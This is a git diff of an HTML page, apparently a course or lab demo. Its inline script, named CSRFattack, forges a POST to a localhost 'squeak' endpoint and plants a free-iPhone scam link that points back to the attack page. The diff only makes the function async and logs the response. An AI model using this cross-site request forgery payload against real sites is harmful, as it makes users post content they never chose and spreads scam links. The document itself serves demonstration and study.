@@ -39,13 +39,13 @@
     <script src="js/popper.min.js"></script>
     <script src="js/bootstrap.min.js"></script>
     <script>
-      function CSRFattack() {
+      async function CSRFattack() {
         let data = new URLSearchParams();
         data.append(
           "squeak",
           'Click <a href="https://niccolo-francioni.github.io/csrf-attack/">here</a> to get the iPhone X for free!'
         );
-        fetch("https://localhost/squeak", {
+        const res = await fetch("https://localhost/squeak", {
           method: "POST",
           mode: "no-cors",
           headers: {
@@ -53,6 +53,7 @@
           },
           body: data,
         });
+        console.log(await res);
       }
     </script>
   </body>
